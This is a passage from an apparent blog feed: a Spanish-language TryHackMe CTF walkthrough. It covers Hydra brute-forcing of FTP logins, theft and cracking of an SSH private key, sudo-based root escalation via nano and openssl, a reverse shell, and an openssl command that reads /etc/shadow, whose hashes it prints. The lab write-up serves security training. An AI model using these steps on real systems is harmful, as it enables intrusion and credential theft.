&lt;p&gt;Revisando los archivos FTP de configuracion encontramos otra flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_163331.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;No logramos encontrar ningun archivo que nos ayudara para escalar privilegios por lo que utilizamos nuevamente HYDRA con los usuarios encontrados en el servicio FTP. Logramos encontrar la misma contraseña para rcampbell.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_164705.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/kothhacker# ftp kothhacker.thm 
Connected to kothhacker.thm.
220-Ellingson Mineral Company FTP Server
220-
220-WARNING
220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act &lt;span class=&#34;m&#34;&gt;1986&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; 
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kothhacker.thm:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: rcampbell
&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
Password:
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -lah
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
drwxr-x---    &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 22:39 .
drwxr-x---    &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 22:39 ..
lrwxrwxrwx    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp             &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 01:33 .bash_history -&amp;gt; /dev/null
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp           &lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 03:58 .bash_logout
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;3771&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 03:58 .bashrc
drwx------    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 22:16 .cache
-r--------    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp            &lt;span class=&#34;m&#34;&gt;38&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 04:44 .flag
drwx------    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 22:16 .gnupg
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp           &lt;span class=&#34;m&#34;&gt;807&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 03:58 .profile
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gcrawford---ftphydra&#34;&gt;GCRAWFORD - FTP/HYDRA&lt;/h2&gt;
&lt;p&gt;Utilizamos nuevamente HYDRA pero esta vez con el usuario gcrawford en donde logramos obtener una contraseña para el servicio FTP.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_171227.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ingresamos al servicio y encontramos la clave privada y publica SSH de este usuario, además encontramos un archivo de texto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/kothhacker# ftp kothhacker.thm 
Connected to kothhacker.thm.
220-Ellingson Mineral Company FTP Server
220-
220-WARNING
220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act &lt;span class=&#34;m&#34;&gt;1986&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; 
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kothhacker.thm:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: gcrawford
&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
Password:
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -lah
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
drwxr-x---    &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 04:25 .
drwxr-x---    &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 04:25 ..
lrwxrwxrwx    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp             &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 01:31 .bash_history -&amp;gt; /dev/null
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp           &lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 04:00 .bash_logout
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;3771&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 04:00 .bashrc
drwx------    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 17:05 .cache
drwx------    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 17:05 .gnupg
drwxrwxr-x    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 20:53 .local
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp           &lt;span class=&#34;m&#34;&gt;807&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 04:00 .profile
drwx------    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 21:07 .ssh
-r--------    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp           &lt;span class=&#34;m&#34;&gt;252&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 04:25 business.txt
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; .ssh
&lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; Directory successfully changed.
ftp&amp;gt; ls
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp           &lt;span class=&#34;m&#34;&gt;398&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 21:07 authorized_keys
-rw-------    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;1766&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 21:07 id_rsa
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp           &lt;span class=&#34;m&#34;&gt;398&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 21:07 id_rsa.pub
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; get id_rsa
local: id_rsa remote: id_rsa
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; id_rsa &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1766&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;1766&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2.2396 MB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..
&lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; Directory successfully changed.
ftp&amp;gt; get business.txt
local: business.txt remote: business.txt
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; business.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;252&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;252&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.7935 MB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El archivo de texto contiene una flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_171827.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos autenticarnos con el archivo &lt;code&gt;id_rsa&lt;/code&gt; en el servicio SSH pero al parecer el archivo esta protegido por una frase.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/kothhacker# ssh gcrawford@kothhacker.thm -i id_rsa 
Unauthorised access is a federal offense under the Computer Fraud and Abuse Act &lt;span class=&#34;m&#34;&gt;1986&lt;/span&gt;
Enter passphrase &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; key &lt;span class=&#34;s1&#34;&gt;&amp;#39;id_rsa&amp;#39;&lt;/span&gt;: 
Enter passphrase &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; key &lt;span class=&#34;s1&#34;&gt;&amp;#39;id_rsa&amp;#39;&lt;/span&gt;: 
Enter passphrase &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; key &lt;span class=&#34;s1&#34;&gt;&amp;#39;id_rsa&amp;#39;&lt;/span&gt;: 
gcrawford@kothhacker.thm: Permission denied &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;publickey&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
root@upset:~/thm/kothhacker#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos &lt;code&gt;ssh2john&lt;/code&gt; para obtener el hash del archivo -id_rsa- y crackeamos el hash con john.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_172027.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener la frase y logramos obtener una shell con el usuario gcrawford.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_172211.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;nano&lt;/code&gt; con el archivo &lt;code&gt;bussines.txt&lt;/code&gt;. Utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/nano/#sudo&#34;&gt;&lt;strong&gt;nano&lt;/strong&gt;&lt;/a&gt; para obtener una shell root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_172518.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una flag en &lt;code&gt;/root/&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_172620.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Agregamos nuestra clave publica al archivò &lt;code&gt;authorized_keys&lt;/code&gt; e ingresamos con el usuario root en el servicio ssh.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_172851.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Buscamos la flag en el directorio &lt;code&gt;/home&lt;/code&gt; y logramos encontrar las dos ultimas en &lt;code&gt;/home/tryhackme/.flag&lt;/code&gt; y&lt;code&gt; /home/production/.flag&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_173233.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;plague---apihydra&#34;&gt;PLAGUE - API/HYDRA&lt;/h2&gt;
&lt;p&gt;En una de las paginas principales y en robots.txt encontramos un comentario que hacen enfasis en &lt;code&gt;plague&lt;/code&gt;. Utilizamos Hydra y en donde el parametro usuario utilizamos &lt;code&gt;plage&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_174216.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_174237.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos Hydra para intentar logearnos en &lt;code&gt;/backdoor/shell&lt;/code&gt;, logramos encontrar la contraseña para plague.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_174931.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos autenticarnos y ejecutar comandos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_175044.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que podemos ejecutar comandos vamos a obtener una shell inversa.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_175532.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_175505.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;openssl&lt;/code&gt;. Utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/openssl/#file-read&#34;&gt;&lt;strong&gt;GTFOBINS&lt;/strong&gt;&lt;/a&gt; para leer el archivo &lt;code&gt;/etc/shadow&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothhacker/Screenshot_20200710_175953.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LFILE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/etc/shadow
/usr/bin/sudo /usr/bin/openssl enc -in &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$LFILE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos obtener el contenido, las contraseñas encriptadas.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;tryhackme:&lt;span class=&#34;nv&#34;&gt;$6$m6t6Wwb&lt;/span&gt;.Irn8qFzm&lt;span class=&#34;nv&#34;&gt;$LJ8sBnQX6&lt;/span&gt;.XDyqjQuL0XVoVSOXyRlcugWjbp3cN80Xl9344moBmQ/XdQfO2w5Oub4Kz0eBFG4KeP..05hFh171:18378:0:99999:7:::
production:&lt;span class=&#34;nv&#34;&gt;$6$CMJF8CIY$aq3ycncJkhhTa6h6vgec5Dr53cKJmQ&lt;/span&gt;.9Fa.7ZceaolrIr0B5DDKHZfV97GI0puAfrD.hCt0ZOBqtbt/RT/1TV.:18381:0:99999:7:::
ftp:*:18381:0:99999:7:::
rcampbell:&lt;span class=&#34;nv&#34;&gt;$6$OlVRVXBb$5&lt;/span&gt;toooBVqa93gBtUncQNyMHeKvMdy.Wtr9eukllbmOv7wd8X.LaQR/tTYK9D1BCFSVGI3Pr/dD4U08d/8wNwES1:18453:0:99999:7:::
gcrawford:&lt;span class=&#34;nv&#34;&gt;$6$PujyDO0o&lt;/span&gt;$/TQMT0PNSCO.1qavpm26sCu9TAt.OTvjhQrXYVY5S.MNUg6XE0pxHnB3lRqfZEYo1Vjvyo8TY6CTE3FH/vzXL1:18453:0:99999:7:::
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/kothhacker/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/kothhacker/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - uopeasy</title>
        <link>https://sckull.github.io/posts/uopeasy/</link>
        <pubDate>Tue, 07 Jul 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 07 Jul 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/uopeasy/</guid>
        <description>uopeasy es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
